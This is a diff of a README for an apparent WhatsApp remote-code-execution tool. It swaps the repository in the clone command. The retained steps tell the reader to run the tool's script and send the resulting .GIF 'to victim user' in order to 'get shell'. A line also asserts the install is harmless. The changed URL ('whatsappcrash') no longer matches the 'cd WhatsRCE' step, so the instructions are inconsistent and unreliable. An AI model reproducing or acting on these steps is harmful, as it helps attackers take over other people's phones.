@@ -7,7 +7,7 @@ Auto install GCC (no harm command, you can see this is open-source)
 Saving to .GIF file
 How To Use ?
 sudo apt install git
-git clone https://github.com/KeepWannabe/WhatsRCE
+git clone https://github.com/CodewithsagarG/whatsappcrash
 cd WhatsRCE && bash start.sh
 How Get Shell ?
 You just send the .GIF file to victim user AS A DOCUMENT NOT IMAGES
